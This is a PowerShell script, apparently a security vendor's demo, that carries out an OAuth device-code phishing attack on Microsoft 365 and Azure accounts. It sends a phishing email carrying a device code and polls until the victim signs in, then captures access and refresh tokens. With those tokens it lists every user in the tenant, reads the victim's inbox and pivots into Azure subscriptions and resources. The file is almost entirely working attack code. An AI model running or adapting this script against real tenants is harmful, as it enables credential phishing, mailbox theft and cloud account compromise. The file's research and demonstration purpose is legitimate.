<#
____________________________________________________________________________________________________________________
Copyright 2021 Netskope, Inc.
Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following
disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following
disclaimer in the documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Written by Jenko Hwong
____________________________________________________________________________________________________________________

Acknowledgments:
    Dr. Nestori Syynimaa: https://o365blog.com/post/phishing
    Steve Borosh (rvrsh3ll), Bobby Cooke (boku7): https://github.com/rvrsh3ll/TokenTactics

#>

#-------------------------
# Command-line Processing
#-------------------------

param (
    [switch]$i  = $false, # -i: interactive
    [switch]$p  = $false, # -p: page output ala 'more'
    [switch]$v  = $false, # -v: verbose level 1
    [switch]$vv = $false, # -vv: verbose level 2
    [switch]$h  = $false, # -h: usage
    [string]$to,          # -to: send to this email address
    [string]$config       # -config <config.json>, mandatory
)

function Print-Usage {
    param([string]$msg  # optional message
    )

    if ($msg) {
        echo ""
        echo $msg
    }

    echo @"

    usage: demo.ps1 [-i] [-p] [-v|-vv] [-to <email_rcpt>] [-h] -config <config.json>

            -i                  Interactive mode, for demos. Will prompt user for [Enter] in b/t steps.
            -p                  Whether to page output to 'more' (when on *nix system)
            -v | -vv            Verbosity=1|2
            -to <email>         Override config file and send to this email address
            -h                  Show this usage

            -config <cfg.json>  Use cfg.json for settings. Required.

"@
    Exit
}

if ($h) {
    Print-Usage
}

if (!$config) {
    Print-Usage "Error: -config required"
}

$CONF = Get-Content -Path $config | ConvertFrom-Json

# Command-line overrides config file
#
if ($i)  { $CONF.interactive = $true }
if ($p)  { $CONF.page = $true }
if ($v)  { $CONF.verbose = 1 }
if ($vv) { $CONF.verbose = 2 }
if ($to) { [string[]]$CONF.email.to = $to }

echo "$(Get-Date): Starting"

if ($CONF.verbose -ge 2) {
    echo ""
    echo "Configuration:"
    $CONF | ConvertTo-Json -Depth 20 
}

# Create the POST body, we'll be using client id of "Microsoft Office"
# NOTE: client_id should be same throughout i.e. step #0 and step #2
#

# Client ids and resources used in demo
#
$client_id_office = "d3590ed6-52b3-4102-aeff-aad2292ab01c"      # Microsoft Office, step #0,2,6
$resource_graph = "https://graph.microsoft.com"                 # Used in initial call step #0,2
$resource_mgmt = "https://management.azure.com"                 # Used in lateral move step #6

# Other client ids and resources: See TokenTactics for more resources
#
$client_id_az_cli = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"      # Microsoft Azure CLI
$resource_outlook365 = "https://outlook.office365.com"
$resource_storage = "https://storage.azure.com"

echo @"

##################################################################################
# 0. Get a new user code and device code
#       client id: $client_id_office 
#       resource:  $resource_graph"
##################################################################################
"@

# Invoke the REST call to get device and user codes
#
$body=@{
	"client_id" = $client_id_office
	"resource" =  $resource_graph
}
$authResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body

# Retrieve the key fields in the response
#
$user_code          = $authResponse.user_code       # for user to input in the Microsoft auth screen. Verifies user.
$device_code        = $authResponse.device_code     # to be used later in step #2 to retrieve the user oauth tokens after user auth
$interval           = $authResponse.interval        # the interval in secs to poll for oauth tokens in step #2
$expires            = $authResponse.expires_in      # the time (secs) that the user and device codes are valid for 
$verification_uri   = $CONF.email.verification_uri  # verification URI (login page) for the user

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Request:"
    echo ""
    echo "POST https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
    echo $body | ConvertTo-Json -Depth 20
    echo ""
    echo "Response:"
    if ($CONF.page) {
        echo $authResponse |more
    }  else {
        echo $authResponse 
    }
}

# For demos, send a phish email, if configured. The email will have the 
# verification_uri and user_code in it, along with a nice phish msg in 
# demo_email.txt. Follow the link in the email, enter the code to 
# authenticate the user (victim).
#
# Alternatively, for testing, you can skip the email and just bring up a 
# browser, go to the verification_uri in the response, enter the user_code.
# 
if ($CONF.send_email)  {

    if ($CONF.interactive) { Read-Host "Press [Enter] to send a phish email" }

    echo @"

##################################################################################
# 1. Send phish email
##################################################################################
"@

    $to_user = [string]::Join(',',$CONF.email.to)

    if ($CONF.verbose -ge 1) {
        echo "       To:   $to_user"
        echo "       Code: $user_code"
        echo "       URL:  $verification_uri"
        echo ""
    }

    # Setup the SMTP server settings
    #
    $smtp = new-object Net.Mail.SmtpClient($CONF.smtp.server, $CONF.smtp.port)
    $smtp.Credentials = New-Object System.Net.NetworkCredential($CONF.smtp.username, $CONF.smtp.password);
    $smtp.EnableSsl = $true 
    $smtp.Timeout = 400000  

    # Create the email
    #
    $Message = new-object Net.Mail.MailMessage 
    $Message.Subject = $CONF.email.subject
    $Message.From = $CONF.email.from
    foreach ($recip in $CONF.email.to) {
        $Message.To.Add($recip)
    }

    # Substitute the verification_uri and user_code in the email template
    #
    $body_email = Get-Content -Path $CONF.email.body
    $body_email = $body_email -replace '\${USER_CODE}', $user_code
    $body_email = $body_email -replace '\${VERIFICATION_URI}', $verification_uri
    $Message.Body = $body_email
    $Message.IsBodyHTML = $CONF.email.body_html

    if ($CONF.verbose -ge 2) {
        echo "### Message:"
        $Message | ConvertTo-Json -Depth 20
        echo "### End Message:"
    }

    $smtp.Send($Message)
    # if ($CONF.interactive) { Read-Host "Press [Enter] to wait for user to authenticate" }
} else {
    echo @"

##################################################################################
# 1. SKIPPING phish email
##################################################################################
"@
}

echo @"

##################################################################################
# 2. Waiting for user to authenticate...polling for oauth tokens
##################################################################################
"@

# Create POST body for the REST call to check for authentication 
#
$body=@{
	"client_id" =  $client_id_office
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $device_code
	"resource" =   $resource_graph
}

echo ""
echo "Request:"
echo ""
echo "POST https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
$body | ConvertTo-Json -Depth 20
echo ""

# Loop while authorization is pending or until timeout exceeded
#
$continue = $true
while ($continue) {

	Start-Sleep -Seconds $interval
	$total += $interval

	if ($total -gt $expires) {
		Write-Error "Timeout occurred"
		return
	}
				
	# Check for user authentication: 
    #   Will give 40x while pending/errors (exception), and 200 if user has auth'ed.
    #   If 40x plus "pending" then we keep looping
    #   If 40x with real error, we print/exit
    #   If 200, user has auth'ed and we exit loop and get tokens
    #
	try {
		$response = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Body $body -ErrorAction SilentlyContinue

	} catch {
        # Status: 40X. Need to check whether it's "pending" in which case we keep looping
        #   or a real error.
        #
		$details = $_.ErrorDetails.Message | ConvertFrom-Json

		$continue = $details.error -eq "authorization_pending" # waiting for user

		# Show progress
        #
        Write-Host '.' -NoNewLine

		if (!$continue) {

			# If we got HTTP 40X and status is not "authorization_pending",
            # we have a real error. Print it.
            #
			Write-Error $details.error_description
			return # exit program
		}
	}

	# If we got successful response, user has authenticated,
    # break out of loop and continue and fetch OAuth tokens
    #
	if ($response) {
        echo ""
        echo ""
        echo "User has completed authentication and authorization."
        echo ""
		break # Exit the loop and continiue on
	}
}

if ($CONF.interactive) { Read-Host "Press [Enter] to retrieve user's oauth tokens" }


echo @"

##################################################################################
# 3. Retrieve user's oauth tokens (access + refresh)
##################################################################################
"@

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Response:"
    if ($CONF.page) {
        echo $response |more
    }  else {
        echo $response 
    }
}

$token = $response.access_token 
$token_secure = ConvertTo-SecureString $token -AsPlainText -Force 

if ($CONF.interactive) { Read-Host "Press [Enter] to use token to get all AD users" }

echo @"

##################################################################################
# 4. Use oauth tokens to retrieve all users in AD tenant
##################################################################################
"@

$users = Invoke-RestMethod -Method GET -Uri "https://graph.microsoft.com/v1.0/users" -Authentication OAuth -Token $token_secure

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Request:"
    echo ""
    echo "GET https://graph.microsoft.com/v1.0/users"
    echo "Bearer: $token"
    echo ""
    echo "Response:"

    $cnt = 0
    foreach ($u in $users.value) {
        $cnt = $cnt + 1
        echo ""
        echo "[$cnt] name: $($u.displayName)"
        echo "    mail: $($u.mail)"
        echo "    id:   $($u.id)"
    }
}

if ($CONF.verbose -ge 2) {
    echo "Users:"
    if ($CONF.page) {
        $users | ConvertTo-Json -Depth 20 |more
    }  else {
        $users | ConvertTo-Json -Depth 20 
    }
}

echo ""
if ($CONF.interactive) { Read-Host "Press [Enter] to get $($to_user)'s email" }

echo @"

##################################################################################
# 5. Using oauth access token to retrieve $($to_user)'s email
################################################################################## 
"@

$mail = Invoke-RestMethod -Method GET -Uri "https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages?$select=subject,from,receivedDateTime&$top=25&$orderby=receivedDateTime%20DESC" -Authentication OAuth -Token $token_secure

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Request:"
    echo ""
    echo "GET https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages?$select=subject,from,receivedDateTime&$top=25&$orderby=receivedDateTime%20DESC"
    echo "Bearer: $token"
    echo ""
    echo "Response:"

    $msgs = $mail.value | ConvertTo-Json -Depth 20 | ConvertFrom-Json
    $cnt = 0
    foreach ($elem in $msgs) {
        $cnt = $cnt + 1
        echo ""
        echo "[$cnt] Date:    $($elem.receivedDateTime)"
        echo "    From:    $($elem.sender.emailAddress.address)"
        Write-Host "    To:      " -NoNewLine
        foreach ($recip in $elem.toRecipients) {
            Write-Host "$($recip.emailAddress.address)," -NoNewLine
        }
        echo ""
        echo "    Subject: $($elem.subject)"
        # echo "    Body:"
        # echo $elem.bodyPreview
    }
    echo ""
}

if ($CONF.verbose -ge 2) {
    if ($CONF.page) {
        $mail.value | ConvertTo-Json -Depth 20 |more
    }  else {
        $mail.value | ConvertTo-Json -Depth 20 
    }
}

if ($CONF.interactive) { Read-Host "Press [Enter] to get new access token for Azure access" }

echo @"

##################################################################################
# 6. Use refresh token to get new access token for Azure (change resource/scopes)
##################################################################################
"@

$body=@{
    "client_id" =     $client_id_office
    "grant_type" =    "refresh_token"
    "scope" =         "openid"
    "resource" =      $resource_mgmt
    "refresh_token" = $response.refresh_token
}
$azMgmtResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

if ($CONF.verbose -ge 1) { 
    echo ""
    echo "Request:"
    echo ""
    echo "POST https://login.microsoftonline.com/Common/oauth2/token"
    $body | ConvertTo-Json -Depth 20
    echo ""
    echo "Response:"
    if ($CONF.page) {
        echo $azMgmtResponse |more 
    }  else {
        echo $azMgmtResponse 
    }
}

if ($CONF.interactive) { Read-Host "Press [Enter] to access Azure data" }

echo @"

##################################################################################
# 7. Use new access token to query Azure
##################################################################################
"@

$token_az_mgmt = $azMgmtResponse.access_token
$token_az_mgmt_secure = ConvertTo-SecureString $token_az_mgmt -AsPlainText -Force

$subscriptions = Invoke-RestMethod -Method GET -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Authentication OAuth -Token $token_az_mgmt_secure
if ($CONF.verbose -ge 2) {
    echo "Subscriptions:"
    $subscriptions | ConvertTo-Json -Depth 20
}
if ($CONF.verbose -ge 1) {
    $cnt = 0
    foreach ($sub in $subscriptions.value) {
        $cnt = $cnt + 1
        echo ""
        echo "[$cnt] Subscription: $($sub.displayName)"
        echo "    subscriptionId: $($sub.subscriptionId)"
        echo "    tenantId:       $($sub.tenantId)"
        echo "    resources:"
        $resources = Invoke-RestMethod -Method GET -Uri "https://management.azure.com/subscriptions/$($sub.subscriptionId)/resources?api-version=2021-04-01" -Authentication OAuth -Token $token_az_mgmt_secure
        if ($CONF.verbose -ge 1) {
            $cnt2 = 0
            foreach ($r in $resources.value) {
                $cnt2 = $cnt2 + 1
                $arr = $r.id.Split('/')
                $guid = [string]::Join('/',$arr[-2..-1])
                echo ""
                echo "    [$cnt2] Resource: $($guid)"
                echo "        name: $($r.name)"
                echo "        type: $($r.type)"
                echo "        id:   $($r.id)"
            }
        }
        if ($CONF.verbose -ge 2) {
            echo ""
            echo "Resource Objects:"
            if ($CONF.page) {
                $resources | ConvertTo-Json -Depth 20 |more
            }  else {
                $resources | ConvertTo-Json -Depth 20 
            }
        }
    }
    echo ""
}

##################################################################################
# End
##################################################################################

echo "$(Get-Date): Finished"
echo ""
